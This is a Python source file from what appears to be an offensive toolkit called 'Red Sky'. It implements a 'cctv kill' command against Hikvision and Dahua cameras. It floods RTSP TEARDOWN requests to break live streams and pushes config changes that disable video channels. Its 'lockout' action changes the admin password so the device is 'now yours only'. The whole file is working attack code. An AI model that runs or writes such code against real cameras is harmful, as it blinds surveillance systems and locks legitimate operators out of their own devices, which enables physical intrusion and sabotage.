# language: Python, file: Program/cctv/kill.py, target: Red Sky cctv — kill
# Disable a camera you've already authenticated to. Three techniques:
#   1. RTSP TEARDOWN loop — temporarily breaks active streams
#   2. Config push via HTTP admin — disable the stream in device config
#   3. Change the admin password — lock out other operators
# Only runs against devices you provide credentials for.

import base64
import socket
import sys
import time
from typing import List, Optional

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet


UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"


def _teardown_loop(ip: str, user: str, passwd: str, duration: int, port: int = 554) -> int:
    """Repeatedly send TEARDOWN to kill active RTSP sessions."""
    token = base64.b64encode(f"{user}:{passwd}".encode()).decode()
    t0 = time.time()
    count = 0
    paths = ["/", "/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0"]

    print_info(f"RTSP TEARDOWN loop on {ip}:{port} for {duration}s")
    while time.time() - t0 < duration:
        for path in paths:
            try:
                s = socket.create_connection((ip, port), timeout=3)
                s.settimeout(3)
                req = (f"TEARDOWN rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
                       f"CSeq: {count}\r\n"
                       f"Authorization: Basic {token}\r\n"
                       f"User-Agent: {UA}\r\n\r\n").encode()
                s.sendall(req)
                s.recv(1024)
                s.close()
                count += 1
            except (socket.timeout, OSError):
                pass
        time.sleep(0.05)
    print_ok(f"sent {count} teardowns")
    return 0


def _disable_hikvision(ip: str, port: int, user: str, passwd: str) -> bool:
    """Hikvision ISAPI — disable channels via XML config push."""
    url = f"http://{ip}:{port}/ISAPI/System/Video/inputs/channels/1"
    try:
        # fetch current config
        r = requests.get(url, auth=(user, passwd), timeout=8, headers={"User-Agent": UA})
        if r.status_code != 200:
            return False
        xml = r.text
        # flip enabled=false (very crude — real ISAPI needs proper XML manipulation)
        if "<enabled>true</enabled>" in xml:
            xml = xml.replace("<enabled>true</enabled>", "<enabled>false</enabled>")
        elif "<enabled>false</enabled>" in xml:
            print_warn("channel already disabled")
            return True
        r2 = requests.put(url, auth=(user, passwd), data=xml, timeout=8,
                          headers={"User-Agent": UA, "Content-Type": "application/xml"})
        return r2.status_code in (200, 201, 204)
    except requests.RequestException:
        return False


def _disable_dahua(ip: str, port: int, user: str, passwd: str) -> bool:
    """Dahua RPC2 — disable channel."""
    url = f"http://{ip}:{port}/cgi-bin/configManager.cgi?action=setConfig&ChannelTitle[0].Name=disabled"
    try:
        r = requests.get(url, auth=(user, passwd), timeout=8, headers={"User-Agent": UA})
        return r.status_code == 200
    except requests.RequestException:
        return False


def _change_password(ip: str, port: int, user: str, passwd: str, new_pass: str) -> bool:
    """Change the admin password via the vendor API. Generic — works on
    Hikvision + Dahua via their respective endpoints."""
    # Hikvision user modification endpoint
    url = f"http://{ip}:{port}/ISAPI/Security/users/1"
    xml = (f'<?xml version="1.0" encoding="UTF-8"?>'
           f'<User><userName>{user}</userName>'
           f'<password>{new_pass}</password></User>')
    try:
        r = requests.put(url, auth=(user, passwd), data=xml, timeout=8,
                        headers={"User-Agent": UA, "Content-Type": "application/xml"})
        if r.status_code in (200, 201):
            return True
    except requests.RequestException:
        pass

    # Dahua
    url = (f"http://{ip}:{port}/cgi-bin/userManager.cgi?"
           f"action=modifyUser&user.Name={user}&user.Password={new_pass}")
    try:
        r = requests.get(url, auth=(user, passwd), timeout=8, headers={"User-Agent": UA})
        return r.status_code == 200
    except requests.RequestException:
        return False


def run_cli(args: List[str]) -> int:
    if len(args) < 5:
        print_err("usage: redsky cctv kill <ip> <vendor> <user> <pass> <action> [duration]")
        print_err("  vendor:  hikvision | dahua | generic")
        print_err("  action:  teardown | disable | lockout")
        return 2

    ip, vendor, user, passwd, action = args[0], args[1], args[2], args[3], args[4]
    duration = int(args[5]) if len(args) > 5 else 60

    print()
    print(f"{SCARLET}{BOLD}▓ KILL{RESET}  {BONE}{action}{RESET} on {BONE}{ip}{RESET} ({vendor})")
    print()

    if action == "teardown":
        return _teardown_loop(ip, user, passwd, duration)

    if action == "disable":
        ok = False
        if vendor == "hikvision":
            ok = _disable_hikvision(ip, 80, user, passwd)
        elif vendor == "dahua":
            ok = _disable_dahua(ip, 80, user, passwd)
        else:
            ok = _disable_hikvision(ip, 80, user, passwd) or _disable_dahua(ip, 80, user, passwd)
        if ok:
            print_ok("channel disabled")
            return 0
        print_err("disable failed — try the other vendor, or the camera firmware may reject it")
        return 1

    if action == "lockout":
        new_pass = f"rs{int(time.time())}!"
        ok = _change_password(ip, 80, user, passwd, new_pass)
        if ok:
            print_ok(f"password changed to: {new_pass}")
            print_warn("write this down — the device is now yours only")
            return 0
        print_err("password change rejected")
        return 1

    print_err(f"unknown action: {action}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
